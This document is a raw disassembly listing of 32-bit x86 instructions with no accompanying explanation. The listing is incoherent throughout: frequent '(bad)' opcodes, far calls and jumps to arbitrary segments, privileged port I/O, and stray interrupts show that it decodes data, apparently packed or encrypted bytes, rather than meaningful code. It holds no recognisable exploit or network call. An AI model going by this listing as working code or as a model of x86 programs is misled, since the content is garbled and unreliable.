  4075f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f8:	mov    edx,0x10764794
  4075fd:	test   DWORD PTR [si-0x7d5f],edi
  407602:	shl    BYTE PTR [eax+0x3ae18cc4],1
  407608:	or     ah,ch
  40760a:	icebp  
  40760b:	nop
  40760c:	popa   
  40760d:	xor    DWORD PTR [ebx+0x51c00ed9],edx
  407613:	dec    esp
  407614:	sub    esp,DWORD PTR [esi]
  407616:	or     ebp,0x38
  407619:	scas   eax,DWORD PTR es:[edi]
  40761a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40761b:	mov    ch,0xdd
  40761d:	ins    DWORD PTR es:[edi],dx
  40761e:	or     DWORD PTR [esi+0x40],ecx
  407621:	push   ss
  407622:	(bad)  
  407623:	data16 scas al,BYTE PTR es:[edi]
  407625:	in     al,dx
  407626:	xor    dh,BYTE PTR [edi]
  407628:	mov    ebx,DWORD PTR [edi-0x4428680]
  40762e:	push   eax
  40762f:	sub    al,0xa3
  407631:	cli    
  407632:	pop    es
  407633:	xor    DWORD PTR [edi+0x30],esi
  407636:	das    
  407637:	(bad)  
  407638:	mov    al,0x62
  40763a:	cmp    DWORD PTR [edx+0x13892fdd],esi
  407640:	jle    0x4075d1
  407642:	mov    DWORD PTR [edx-0x8],ecx
  407645:	stos   DWORD PTR es:[edi],eax
  407646:	clc    
  407647:	xor    eax,0xbd2358af
  40764c:	sub    ch,BYTE PTR [esi+edx*1]
  40764f:	jno    0x4076c2
  407651:	inc    eax
  407652:	test   al,0x97
  407654:	push   esp
  407655:	jno    0x40764a
  407657:	add    dh,BYTE PTR [edx+ebx*8+0x34]
  40765b:	jl     0x407675
  40765d:	fst    DWORD PTR [esi+0x291b0d5]
  407663:	in     eax,0x19
  407665:	sbb    edi,edi
  407667:	cmc    
  407668:	and    al,0xf6
  40766a:	call   0xd0b6:0x97d745f
  407671:	inc    edi
  407672:	push   cs
  407673:	pop    edi
  407674:	xor    eax,0x98831073
  407679:	scas   eax,DWORD PTR es:[edi]
  40767a:	jmp    0x3d2b:0xdff27f85
  407681:	int    0xe2
  407683:	jns    0x407691
  407685:	les    ebp,FWORD PTR [ecx+0x573b6dbc]
  40768b:	sub    esp,DWORD PTR [ebp+0x2d]
  40768e:	mov    edx,0x16fc2cbb
  407693:	add    al,0xda
  407695:	dec    eax
  407696:	sub    eax,0x406a41bd
  40769b:	rol    BYTE PTR [eax],cl
  40769d:	aas    
  40769e:	mov    BYTE PTR fs:[ebp+0x72235bf4],ah
  4076a5:	sbb    edi,DWORD PTR [ecx]
  4076a7:	dec    edi
  4076a8:	pop    esp
  4076a9:	ins    DWORD PTR es:[edi],dx
  4076aa:	xlat   BYTE PTR ds:[ebx]
  4076ab:	sub    eax,0xbed31d12
  4076b0:	cwde   
  4076b1:	push   edi
  4076b2:	scas   al,BYTE PTR es:[edi]
  4076b3:	push   0xce6b566c
  4076b8:	or     eax,0x40af6fd0
  4076bd:	in     al,0x7a
  4076bf:	inc    esi
  4076c0:	xor    esi,ebx
  4076c2:	xchg   esp,eax
  4076c3:	xor    al,0xd9
  4076c5:	jbe    0x407674
  4076c7:	or     ecx,DWORD PTR [eax]
  4076c9:	xchg   edx,eax
  4076ca:	sbb    al,0x9
  4076cc:	imul   esi,DWORD PTR [ebp+0x2670aca0],0xffffffa2
  4076d3:	mov    eax,ds:0xe8fd733e
  4076d8:	or     eax,0x9757083
  4076dd:	mov    al,0x2c
  4076df:	bound  ebp,QWORD PTR [ebx-0x35dd9f3a]
  4076e5:	iret   
  4076e6:	xchg   edx,eax
  4076e7:	pop    eax
  4076e8:	sahf   
  4076e9:	push   ecx
  4076ea:	lea    ecx,[ebx+esi*8-0x33]
  4076ee:	inc    ecx
  4076ef:	mov    al,0xcb
  4076f1:	js     0x4076fd
  4076f3:	test   esi,ebp
  4076f5:	adc    DWORD PTR [ebx],eax
  4076f7:	inc    edi
  4076f8:	sbb    DWORD PTR [edi+0x7049d46f],ecx
  4076fe:	dec    eax
  4076ff:	ror    DWORD PTR [eax+0x1a],0x88
  407703:	push   esp
  407704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407705:	retf   
  407706:	pushf  
  407707:	adc    DWORD PTR [edi-0x1f],ebp
  40770a:	inc    edx
  40770b:	(bad)  
  40770c:	std    
  40770d:	and    eax,edi
  40770f:	cmp    al,0x87
  407711:	pop    ebp
  407712:	adc    DWORD PTR [edi-0x44],esp
  407715:	push   ss
  407716:	xor    eax,0x1dd4be48
  40771b:	mov    eax,ds:0x86279214
  407720:	mov    DWORD PTR [ebx+0x29],esi
  407723:	out    dx,al
  407724:	stos   BYTE PTR es:[edi],al
  407725:	or     eax,ebp
  407727:	xor    ebx,esi
  407729:	mov    eax,ds:0x76de204d
  40772e:	lock jbe 0x4076c6
  407731:	push   ss
  407732:	sbb    eax,0x2c69d6f3
  407737:	shl    al,1
  407739:	pop    edi
  40773a:	sub    esi,DWORD PTR [esp+eiz*4+0x74e364ec]
  407741:	jns    0x4077ac
  407743:	push   ecx
  407744:	test   BYTE PTR [esi+0x5b],0x88
  407748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407749:	mov    ah,0xb4
  40774b:	icebp  
  40774c:	jne    0x4076d1
  40774e:	test   BYTE PTR [edi+0x69bd86f0],bh
  407754:	adc    eax,0x7ec8867f
  407759:	add    eax,0xfd28382b
  40775e:	pusha  
  40775f:	cmp    DWORD PTR [esp+esi*8-0x1e23286f],esp
  407766:	xor    BYTE PTR [edi],dl
  407768:	dec    esp
  407769:	lods   eax,DWORD PTR ds:[esi]
  40776a:	jo     0x407777
  40776c:	sbb    eax,0xaab69421
  407771:	cmp    BYTE PTR [eax-0x7c408e73],ch
  407777:	mov    edi,0x9e7bc096
  40777c:	inc    edi
  40777d:	in     eax,dx
  40777e:	mov    ebx,0xfc352b9e
  407783:	bound  edx,QWORD PTR [esi-0x21db4c4a]
  407789:	adc    eax,0x3995276e
  40778e:	and    al,0xb5
  407790:	pushf  
  407791:	xor    BYTE PTR [esi+0x53],0x79
  407795:	loopne 0x407781
  407797:	xchg   BYTE PTR [esi-0x35],cl
  40779a:	call   0xd74c:0xfec8c3fd
  4077a1:	mov    al,ds:0x185ab723
  4077a6:	loope  0x4077c9
  4077a8:	dec    ebp
  4077a9:	jecxz  0x4077af
  4077ab:	rcl    DWORD PTR [ebx-0x2b],0x31
  4077af:	adc    BYTE PTR [ebx+ecx*1-0x33875fe8],bh
  4077b6:	std    
  4077b7:	push   ss
  4077b8:	or     eax,0x2f317c47
  4077bd:	sti    
  4077be:	and    bh,bl
  4077c0:	mov    esp,0xcfaeb3cf
  4077c5:	shr    BYTE PTR [edi],cl
  4077c7:	ins    BYTE PTR es:[edi],dx
  4077c8:	test   BYTE PTR [ebp-0x7e],cl
  4077cb:	adc    edi,edx
  4077cd:	out    0xa0,al
  4077cf:	push   ss
  4077d0:	and    BYTE PTR [edi],0xdb
  4077d3:	es int 0xf5
  4077d6:	and    ebp,ebx
  4077d8:	ja     0x4077ae
  4077da:	push   ss
  4077db:	ret    0xb59c
  4077de:	xor    ch,BYTE PTR [eax]
  4077e0:	xchg   edi,eax
  4077e1:	inc    eax
  4077e2:	cs jmp 0x4077df
  4077e5:	fdivr  DWORD PTR [edi+0x6a]
  4077e8:	aad    0xb2
  4077ea:	mov    ?,WORD PTR [esi-0x34fd3dc4]
  4077f0:	loop   0x40780d
  4077f2:	loopne 0x40785e
  4077f4:	sub    eax,0xc090cab9
  4077f9:	out    0xc,eax
  4077fb:	cdq    
  4077fc:	ret    
  4077fd:	dec    DWORD PTR [ecx+esi*2+0x4945c228]
  407804:	arpl   bp,dx
  407806:	test   eax,0x8f364bcb
  40780b:	imul   DWORD PTR [eax+edi*8+0x7]
  40780f:	mov    dh,BYTE PTR ds:0x2f11c9ec
  407815:	rcl    BYTE PTR [edi+0x3bd5196a],0xa2
  40781c:	pop    esp
  40781d:	jnp    0x40788d
  40781f:	(bad)  
  407821:	fdiv   DWORD PTR [ebx+0x5ca02bcc]
  407827:	pop    edx
  407828:	push   ebp
  407829:	xchg   ebx,eax
  40782a:	pop    es
  40782b:	inc    esp
  40782c:	leave  
  40782d:	inc    esi
  40782e:	and    DWORD PTR [eax+0xa],esi
  407831:	(bad)  
  407832:	addr16 mov edx,0x5c743fe6
  407838:	push   cs
  407839:	pop    eax
  40783a:	jle    0x4078a9
  40783c:	aad    0x61
  40783e:	in     al,0x46
  407840:	mov    ebp,0xf8e07632
  407845:	inc    esp
  407846:	or     al,0x76
  407848:	in     eax,dx
  407849:	jo     0x407876
  40784b:	pop    esp
  40784c:	xchg   edx,eax
  40784d:	out    0x69,al
  40784f:	xor    DWORD PTR [esi+edi*2+0x7b3b8fd6],ecx
  407856:	xchg   bh,cl
  407858:	in     al,0x7
  40785a:	sbb    BYTE PTR [eax+0x1555f792],ch
  407860:	push   0xfffffff7
  407862:	(bad)  
  407863:	gs into 
  407865:	cmp    DWORD PTR [esp+edx*8],edx
  407868:	xchg   DWORD PTR [ebx-0x1c],ebx
  40786b:	sbb    eax,0x989df9d2
  407870:	cdq    
  407871:	or     BYTE PTR [edi+0xb],0x41
  407875:	mov    cl,0x58
  407877:	fsub   st(1),st
  407879:	sti    
  40787a:	hlt    
  40787b:	adc    DWORD PTR [edx+edi*2+0x25c93269],esp
  407882:	cmp    DWORD PTR [eax-0x11],esi
  407885:	xchg   esp,eax
  407886:	sbb    esi,edi
  407888:	xchg   esi,eax
  407889:	xchg   esi,eax
  40788a:	jns    0x4078d3
  40788c:	test   al,0x84
  40788e:	push   eax
  40788f:	test   BYTE PTR ds:0xa34f4f6f,0xa0
  407896:	not    bh
  407898:	mov    edx,0xe7b3fdf3
  40789d:	(bad)  
  40789f:	lds    edi,FWORD PTR [ecx+0x29ad918c]
  4078a5:	retf   
  4078a6:	cmp    eax,DWORD PTR [ebx+0x27f17670]
  4078ac:	sbb    DWORD PTR [ecx+ebp*4-0x152750c2],ebx
  4078b3:	or     eax,DWORD PTR [eax]
  4078b5:	push   edi
  4078b6:	push   ebx
  4078b7:	ja     0x407901
  4078b9:	(bad)  
  4078ba:	lds    ebx,FWORD PTR [ebp+eiz*4+0x4e40a375]
  4078c1:	mov    dh,0x96
  4078c3:	push   esp
  4078c4:	adc    al,0x1f
  4078c6:	jl     0x4078b9
  4078c8:	scas   al,BYTE PTR es:[edi]
  4078c9:	mov    eax,ds:0x6b4fdb70
  4078ce:	call   0x77f:0xc2da0b91
  4078d5:	dec    ebx
  4078d6:	xor    DWORD PTR [edi-0x13c5a0d4],eax
  4078dc:	int    0x46
  4078de:	xchg   ecx,eax
  4078df:	mov    ds:0x67231ef6,eax
  4078e4:	xchg   ebp,eax
  4078e5:	in     al,dx
  4078e6:	jmp    0x9fc77494
  4078eb:	arpl   cx,ax
  4078ed:	mov    esi,0xa1be5e1e
  4078f2:	mov    bl,0x95
  4078f4:	push   eax
  4078f5:	fcmovbe st,st(2)
  4078f7:	dec    esp
  4078f8:	xor    al,0x9c
  4078fa:	int3   
  4078fb:	mov    dl,0x77
  4078fd:	mov    dh,0xfa
  4078ff:	cmp    al,0xaa
  407901:	sub    eax,0xe5d4a297
  407906:	test   eax,0x9fa8563
  40790b:	lods   eax,DWORD PTR ds:[esi]
  40790c:	fdiv   st(7),st
  40790e:	gs add bl,dh
  407911:	xchg   esi,eax
  407912:	cmp    eax,0x1a26d2d1
  407917:	jle    0x4078af
  407919:	fadd   QWORD PTR [esi+0x6250b7be]
  40791f:	sbb    bl,BYTE PTR [ebp-0x26]
  407922:	pop    edx
  407923:	mov    WORD PTR [edx+edx*8],gs
  407926:	cwde   
  407927:	push   es
  407928:	or     DWORD PTR [edx+eiz*8],ecx
  40792b:	push   ebx
  40792c:	dec    esi
  40792d:	mov    ds:0x46bea95f,al
  407932:	add    bl,cl
  407934:	lea    esi,[edx]
  407936:	cmc    
  407937:	popf   
  407938:	fistp  DWORD PTR [ebp-0xd]
  40793b:	(bad)  
  40793d:	pop    ecx
  40793e:	sub    eax,0x5d64a820
  407943:	dec    ecx
  407944:	sbb    esi,esp
  407946:	jmp    0x35616bd2
  40794b:	pop    esi
  40794c:	jo     0x407975
  40794e:	fidivr DWORD PTR [edi+0x425a75bb]
  407954:	adc    eax,DWORD PTR [eax]
  407956:	push   eax
  407957:	mov    cl,0xe
  407959:	fisttp QWORD PTR [esi-0x2cd71fc6]
  40795f:	pop    eax
  407960:	ja     0x4078eb
  407962:	(bad)  
  407963:	imul   esi,DWORD PTR [edi],0xe3ee256a
  407969:	mov    ah,0xc
  40796b:	fcom   QWORD PTR [eax+esi*2+0x45]
  40796f:	cmp    al,0x12
  407971:	cmp    bh,BYTE PTR [edx+0x10549a81]
  407977:	ja     0x407931
  407979:	int    0x63
  40797b:	(bad)  
  40797c:	mov    ds:0xeba91ae1,al
  407981:	mov    al,BYTE PTR [edx+0x30]
  407984:	jge    0x40794e
  407986:	xor    edx,DWORD PTR gs:0xd8ebde72
  40798d:	xchg   ebp,eax
  40798e:	dec    edx
  40798f:	mov    ss,WORD PTR [eax+0x6fdfac29]
  407995:	push   esi
  407996:	sbb    DWORD PTR ds:0x9c6b3cf3,ebp
  40799c:	xor    DWORD PTR [edx-0x28],ebp
  40799f:	rcl    DWORD PTR [edi-0x6754e586],1
  4079a5:	shl    DWORD PTR [edi+0x42],cl
  4079a8:	scas   al,BYTE PTR es:[edi]
  4079a9:	xchg   ebp,eax
  4079aa:	hlt    
  4079ab:	mov    esi,0xee5dcb30
  4079b0:	(bad)  
  4079b1:	stc    
  4079b2:	scas   al,BYTE PTR es:[edi]
  4079b3:	xor    eax,0x174caf0
  4079b8:	int    0x40
  4079ba:	imul   esp,esp,0x6a4ee9b3
  4079c0:	out    dx,al
  4079c1:	or     ch,BYTE PTR [ecx-0x35]
  4079c4:	in     eax,0xb9
  4079c6:	push   0xffffffc3
  4079c8:	sub    al,0x50
  4079ca:	hlt    
  4079cb:	test   bl,dl
  4079cd:	lods   eax,DWORD PTR ds:[esi]
  4079ce:	cmp    BYTE PTR [esi-0x59],bl
  4079d1:	arpl   WORD PTR [edi],cx
  4079d3:	repnz pushf 
  4079d5:	inc    edi
  4079d6:	mov    edi,0x1737e27c
  4079db:	mov    ah,0x57
  4079dd:	(bad)  
  4079de:	aas    
  4079df:	loop   0x4079f3
  4079e1:	or     ebp,DWORD PTR [ebp+0xa]
  4079e4:	in     eax,0xe7
  4079e6:	arpl   WORD PTR [edi],dx
  4079e8:	jmp    0x4079ec
  4079ea:	scas   eax,DWORD PTR es:[edi]
  4079eb:	mov    cl,0x4
  4079ed:	pop    ebp
  4079ee:	cld    
  4079ef:	mov    eax,ds:0xabc956bf
  4079f4:	mov    al,BYTE PTR [edx-0x3f47c761]
  4079fa:	mov    ah,0xe9
  4079fc:	mov    BYTE PTR [ebx-0x6d23021e],dh
  407a02:	adc    eax,0xa4915d27
  407a07:	inc    esp
  407a08:	sub    eax,0x2e4f0d87
  407a0d:	mov    fs,WORD PTR [ebx+esi*4]
  407a10:	outs   dx,DWORD PTR ds:[esi]
  407a11:	(bad)  
  407a12:	add    eax,0xb2690f26
  407a17:	ja     0x407a34
  407a19:	fnstcw WORD PTR [eax]
  407a1b:	psubsb mm6,mm7
  407a1e:	push   cs
  407a1f:	pop    ss
  407a20:	jae    0x407a47
  407a22:	mov    bh,0xb2
  407a24:	mov    ch,0x77
  407a26:	call   FWORD PTR [ecx+0x6f84ddaa]
  407a2c:	cdq    
  407a2d:	sub    bh,BYTE PTR [edi+0x669ea293]
  407a33:	jne    0x407a29
  407a35:	xor    al,0xcc
  407a37:	dec    edi
  407a38:	xor    eax,0x8c795277
  407a3d:	das    
  407a3e:	rcl    DWORD PTR [ebx+0x79935583],cl
  407a44:	les    edx,FWORD PTR ds:0x498b
  407a49:	push   edi
  407a4a:	push   edx
  407a4b:	call   0xf054:0x42132fdf
  407a52:	xor    esi,ecx
  407a54:	inc    ecx
  407a55:	(bad)  
  407a57:	into   
  407a58:	cmp    BYTE PTR [esi-0xd],ch
  407a5b:	imul   edx,DWORD PTR [ebx+0x53217ba2],0xc79b15c0
  407a65:	std    
  407a66:	and    bh,BYTE PTR [eax-0x6f]
  407a69:	test   al,0x41
  407a6b:	daa    
  407a6c:	inc    ebx
  407a6d:	xor    eax,0x2eba089c
  407a72:	push   eax
  407a73:	in     eax,dx
  407a74:	cli    
  407a75:	cmp    esi,edx
  407a77:	dec    ebx
  407a79:	cmp    al,0x6f
  407a7b:	stc    
  407a7c:	stos   DWORD PTR es:[edi],eax
  407a7d:	dec    esi
  407a7e:	push   esi
  407a7f:	scas   al,BYTE PTR es:[edi]
  407a80:	pop    ecx
  407a81:	push   edx
  407a82:	inc    esi
  407a83:	neg    DWORD PTR [esi+0x56]
  407a86:	and    DWORD PTR [edi],edi
  407a88:	ror    DWORD PTR [ebx+edx*4+0xaf474ad],cl
  407a8f:	xchg   esp,eax
  407a90:	push   esi
  407a91:	iret   
  407a92:	scas   al,BYTE PTR es:[edi]
  407a93:	jmp    DWORD PTR [eax]
  407a95:	pushf  
  407a96:	out    dx,eax
  407a97:	push   0xb9f9e769
  407a9c:	inc    ebp
  407a9d:	sub    bl,dh
  407a9f:	test   ecx,0x30a0fef
  407aa5:	fstp   DWORD PTR [edi+0x6]
  407aa8:	out    0xdb,al
  407aaa:	and    al,0x5a
  407aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aad:	inc    edi
  407aae:	mov    ecx,0xe989e703
  407ab3:	jb     0x407aa0
  407ab5:	or     ch,BYTE PTR [edx-0x52]
  407ab8:	push   es
  407ab9:	outs   dx,DWORD PTR ds:[esi]
  407aba:	ss test al,0xa9
  407abd:	aam    0x97
  407abf:	dec    edi
  407ac0:	ror    DWORD PTR [esi],cl
  407ac2:	dec    ebx
  407ac3:	aam    0xe5
  407ac5:	pop    ecx
  407ac6:	(bad)  
  407ac7:	pop    esi
  407ac8:	std    
  407ac9:	xchg   ebp,eax
  407aca:	push   edi
  407acb:	dec    edx
  407acc:	xor    al,0xd8
  407ace:	jmp    0x407aaa
  407ad0:	fisttp DWORD PTR [edi+0x29]
  407ad3:	mov    DWORD PTR [eax-0x5e7b3e82],esp
  407ad9:	sub    bh,BYTE PTR ds:0x57ad5173
  407adf:	sbb    eax,0x619e25af
  407ae4:	jno    0x407b08
  407ae6:	xchg   esp,eax
  407ae7:	xor    BYTE PTR [eax-0x77ce3f92],ah
  407aed:	pop    ebp
  407aee:	add    edi,eax
  407af0:	cmp    edi,ebx
  407af2:	cmp    bh,dl
  407af4:	inc    edi
  407af5:	shl    BYTE PTR [esi+0x69],cl
  407af8:	mov    bh,0xf7
  407afa:	lock je 0x407ab2
  407afd:	mov    dh,0x8f
  407aff:	aas    
  407b00:	inc    ebp
  407b01:	repnz sub esp,ebp
  407b04:	das    
  407b05:	jne    0x407b1a
  407b07:	imul   edx,eax,0x69a9fe24
  407b0d:	xor    dh,ch
  407b0f:	jnp    0x407b57
  407b11:	retf   
  407b12:	aad    0xc4
  407b14:	adc    BYTE PTR [ebx+0x49],dh
  407b17:	inc    esi
  407b18:	mov    DWORD PTR [edi],ecx
  407b1a:	hlt    
  407b1b:	mov    WORD PTR [eax+edx*8],ds
  407b1e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  407b20:	pop    esi
  407b21:	mov    DWORD PTR [edx-0x4f],esp
  407b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b25:	shl    BYTE PTR [ebp+0x5e],1
  407b28:	(bad)  [ecx-0x14a3d456]
  407b2e:	clc    
  407b2f:	ret    
  407b30:	sub    BYTE PTR [edx],bl
  407b32:	and    al,0x75
  407b34:	jns    0x407ac6
  407b36:	pop    ds
  407b37:	outs   dx,DWORD PTR ds:[esi]
  407b38:	arpl   WORD PTR [edi+0x397c380e],si
  407b3e:	adc    cl,BYTE PTR [esi]
  407b40:	jne    0x407b7f
  407b42:	xor    BYTE PTR [ebp+0x5ca212eb],0x89
  407b49:	loop   0x407b51
  407b4b:	and    eax,0x969a9e19
  407b50:	inc    ebx
  407b51:	nop
  407b52:	mov    BYTE PTR [edx+ebx*2-0x6936a149],ch
  407b59:	sub    bh,BYTE PTR [edi-0x60]
  407b5c:	jo     0x407b9a
  407b5e:	fidivr DWORD PTR [edi-0x2e]
  407b61:	mov    ds:0xc07278e3,al
  407b66:	sub    DWORD PTR ds:0xb6e9d002,esi
  407b6c:	and    ebx,edi
  407b6e:	push   es
  407b6f:	cmp    BYTE PTR [edi],al
  407b71:	mov    ds:0xfff38aa2,al
  407b76:	inc    ebx
  407b77:	mov    edx,0x27803737
  407b7c:	mov    cl,BYTE PTR ds:0xbc30b108
  407b82:	(bad)  
  407b83:	ficomp DWORD PTR [edi+0x7c]
  407b86:	lds    edx,FWORD PTR [ebx]
  407b88:	leave  
  407b89:	shr    ebp,1
  407b8b:	mov    edi,gs
  407b8d:	xor    dh,cl
  407b8f:	ror    BYTE PTR [ebp+eiz*2-0x13aeae93],0xbc
  407b97:	and    esp,0x60
  407b9a:	adc    DWORD PTR [esi],edi
  407b9c:	xor    dl,BYTE PTR [edx]
  407b9e:	stos   DWORD PTR es:[edi],eax
  407b9f:	sar    BYTE PTR ds:0xc3e5ef0c,1
  407ba5:	pop    eax
  407ba6:	sub    eax,0xc66a30f0
  407bab:	jmp    0xd698:0xf1ee7ff6
  407bb2:	leave  
  407bb3:	rol    bh,0x72
  407bb6:	xor    ebx,DWORD PTR [esi]
  407bb8:	mov    al,0x56
  407bba:	jl     0x407be6
  407bbc:	loope  0x407c38
  407bbe:	push   eax
  407bbf:	retf   
  407bc0:	(bad)  
  407bc1:	push   0x3288f224
  407bc6:	in     al,dx
  407bc7:	or     al,0xa5
  407bc9:	outs   dx,DWORD PTR ds:[esi]
  407bca:	mov    ah,0x26
  407bcc:	pop    edi
  407bcd:	enter  0x516f,0x52
  407bd1:	or     cl,BYTE PTR [edi-0x65]
  407bd4:	or     dh,0x26
  407bd7:	repz mov ds:0xb02509bd,eax
  407bdd:	nop
  407bde:	out    dx,al
  407bdf:	gs and cl,bh
  407be2:	(bad)  
  407be4:	xchg   ebp,eax
  407be5:	call   0xfbf1:0xa45af2ac
  407bec:	je     0x407bc2
  407bee:	pop    ebx
  407bef:	sbb    DWORD PTR [ecx-0x9],ebp
  407bf2:	fdiv   QWORD PTR [esi+0x4b5ff95]
  407bf8:	push   DWORD PTR [ebx+ebp*8-0x1d28580c]
  407bff:	or     al,0xa2
  407c01:	mov    gs,WORD PTR [ebp+0x3be8a307]
  407c07:	push   ebp
  407c08:	jp     0x407c0a
  407c0a:	mov    al,ds:0xf5e3aba4
  407c0f:	jb     0x407c77
  407c11:	sub    eax,0xda7e08ab
  407c16:	push   cs
  407c17:	int3   
  407c18:	into   
  407c19:	shl    DWORD PTR [edx],1
  407c1b:	mov    ds:0x25ec9295,al
  407c20:	push   cs
  407c21:	pop    ds
  407c22:	cmp    al,0x4d
  407c24:	mov    dh,0xd0
  407c26:	aas    
  407c27:	mov    ecx,0x7317593e
  407c2c:	xchg   BYTE PTR [eax+0x4ec182d2],al
  407c32:	jns    0x407c78
  407c34:	imul   edi,DWORD PTR [esp+edi*1-0x42],0xb4674dc8
  407c3c:	mov    edi,0x5bf4dd98
  407c41:	out    dx,al
  407c42:	cli    
  407c43:	dec    edx
  407c44:	mov    al,ds:0x32d21d23
  407c49:	mov    BYTE PTR [ecx*1+0x6c46b706],ch
  407c50:	sbb    DWORD PTR [ebx+ebp*2],ecx
  407c53:	in     al,dx
  407c54:	stos   BYTE PTR es:[edi],al
  407c55:	rcr    dh,0xa9
  407c58:	mov    ebx,0x5014054
  407c5d:	aam    0xe0
  407c5f:	test   eax,0x4e591f97
  407c64:	pop    edx
  407c65:	and    esp,ecx
  407c67:	cmp    DWORD PTR [edi-0x3a],0x8c60fa18
  407c6e:	nop
  407c6f:	loope  0x407ca7
  407c71:	fwait
  407c72:	mov    al,ds:0x2fc825c4
  407c77:	cmp    eax,0xf30eb8b
  407c7c:	sub    al,0x24
  407c7e:	sbb    ah,BYTE PTR fs:[eax+0x37]
  407c82:	ja     0x407c38
  407c84:	lods   al,BYTE PTR ds:[esi]
  407c85:	icebp  
  407c86:	ret    0x149a
  407c89:	(bad)  
  407c8a:	fmul   QWORD PTR [edx+0x4d]
  407c8d:	fwait
  407c8e:	in     eax,0xb
  407c90:	stc    
  407c91:	cmc    
  407c92:	(bad)  
  407c93:	(bad)  
  407c94:	out    dx,al
  407c95:	cli    
  407c96:	test   al,0xb9
  407c98:	stos   DWORD PTR es:[edi],eax
  407c99:	xor    al,0x2e
  407c9b:	jne    0x407c88
  407c9d:	pusha  
  407c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c9f:	dec    edi
  407ca0:	repnz mov cl,0xe0
  407ca3:	jecxz  0x407cea
  407ca5:	mov    ds:0x59cfab7a,eax
  407caa:	out    dx,eax
  407cab:	mov    ds:0x3f0bf0a2,al
  407cb0:	or     eax,DWORD PTR [eax+eiz*4-0x24]
  407cb4:	dec    eax
  407cb5:	stc    
  407cb6:	pusha  
  407cb7:	cmp    dh,BYTE PTR [ebp+eiz*8+0x626ba2a1]
  407cbe:	popa   
  407cbf:	and    BYTE PTR [esi],dl
  407cc1:	push   esp
  407cc2:	xor    al,0xa8
  407cc4:	int3   
  407cc5:	idiv   DWORD PTR [eax+0x5fe15651]
  407ccb:	cdq    
  407ccc:	lds    esp,FWORD PTR [esi-0x67e23df1]
  407cd2:	out    0x5d,eax
  407cd4:	push   eax
  407cd5:	adc    dl,dh
  407cd7:	or     edx,DWORD PTR [ecx]
  407cd9:	stos   BYTE PTR es:[edi],al
  407cda:	cmc    
  407cdb:	sub    al,0x2c
  407cdd:	mov    edi,0x1f4588f9
  407ce2:	mov    bl,0xc5
  407ce4:	rol    ebx,1
  407ce6:	pop    esi
  407ce7:	fist   WORD PTR [edx]
  407ce9:	add    eax,0xfb5fbbbb
  407cee:	xchg   BYTE PTR [esi-0x596ba720],al
  407cf4:	imul   esp,DWORD PTR [eax+0x38],0xffffffc7
  407cf8:	sti    
  407cf9:	(bad)  
  407cfa:	mov    esp,0x21ae24cb
  407cff:	popa   
  407d00:	repz mov ebp,0xcbed0736
  407d06:	xchg   ebp,eax
  407d07:	leave  
  407d08:	jp     0x407d1a
  407d0a:	dec    ebx
  407d0b:	std    
  407d0c:	mov    dh,0xc9
  407d0e:	and    eax,0x7cc7ca8a
  407d13:	pop    es
  407d14:	mov    al,ds:0xb95c6039
  407d19:	test   BYTE PTR [ebx],ah
  407d1b:	in     al,0xf
  407d1d:	fdiv   st(0),st
  407d1f:	lahf   
  407d20:	addr16 fwait
  407d22:	add    esi,edx
  407d24:	xchg   ecx,eax
  407d25:	fistp  WORD PTR [eax+edx*1+0x262b99f]
  407d2c:	int3   
  407d2d:	sahf   
  407d2e:	cwde   
  407d2f:	fistp  DWORD PTR [eax+0x10]
  407d32:	sbb    eax,0xe4dfe88e
  407d37:	sbb    edi,DWORD PTR [esi+0x64]
  407d3a:	mov    ecx,0xc72bc51f
  407d3f:	mov    dh,0x4
  407d41:	sbb    DWORD PTR [ecx-0x36],esi
  407d44:	out    0x89,eax
  407d46:	test   al,0x5d
  407d48:	icebp  
  407d49:	xchg   edx,esp
  407d4b:	je     0x407d94
  407d4d:	jo     0x407d0c
  407d4f:	in     eax,0x77
  407d51:	inc    ecx
  407d52:	aad    0xc8
  407d54:	inc    edx
  407d55:	(bad)  
  407d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d57:	inc    ebx
  407d58:	vmptrst QWORD PTR [ebx]
  407d5b:	mov    ebx,0x934262a1
  407d60:	jl     0x407d5c
  407d62:	jae    0x407d01
  407d64:	jg     0x407d42
  407d66:	sar    BYTE PTR [edi],1
  407d68:	or     ch,BYTE PTR [ebx+0x43]
  407d6b:	push   ebp
  407d6c:	push   ecx
  407d6d:	dec    esi
  407d6e:	mov    ds:0x525466b0,eax
  407d73:	push   ecx
  407d74:	push   eax
  407d75:	add    esi,ebx
  407d77:	scas   eax,DWORD PTR es:[edi]
  407d78:	repnz xchg edx,eax
  407d7a:	xor    al,al
  407d7c:	sbb    edx,DWORD PTR [eax+edi*8-0x40]
  407d80:	clc    
  407d81:	dec    edi
  407d82:	or     dh,ch
  407d84:	lds    ebx,FWORD PTR [ebp-0x6b34934b]
  407d8a:	xor    eax,esi
  407d8c:	dec    ebp
  407d8d:	mov    ds:0x2621f128,al
  407d92:	sbb    al,0xac
  407d94:	push   0x23
  407d96:	mov    edx,0x6c77f4c5
  407d9b:	and    DWORD PTR [esi-0x4d],ebx
  407d9e:	das    
  407d9f:	imul   ecx,edi,0x215c7b7a
  407da5:	adc    eax,0xbe4bdf27
  407daa:	leave  
  407dab:	in     eax,0xe2
  407dad:	push   eax
  407dae:	cmp    al,BYTE PTR ds:0x88bcb95f
  407db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407db5:	fcmovnb st,st(1)
  407db7:	(bad)  
  407db9:	inc    esi
  407dba:	mov    ds:0x3ec4a78b,eax
  407dbf:	hlt    
  407dc0:	add    DWORD PTR [edx+ebp*4+0x158a0ced],ecx
  407dc7:	mov    ebp,DWORD PTR [esi]
  407dc9:	imul   esp,DWORD PTR [ebx-0x646c4dbb],0xe934b677
  407dd3:	adc    ah,0xae
  407dd6:	and    dh,BYTE PTR [edx+ebx*8+0x1dc1c5da]
  407ddd:	cs ins DWORD PTR es:[edi],dx
  407ddf:	scas   al,BYTE PTR es:[edi]
  407de0:	jp     0x407e3c
  407de2:	mov    bh,0x7c
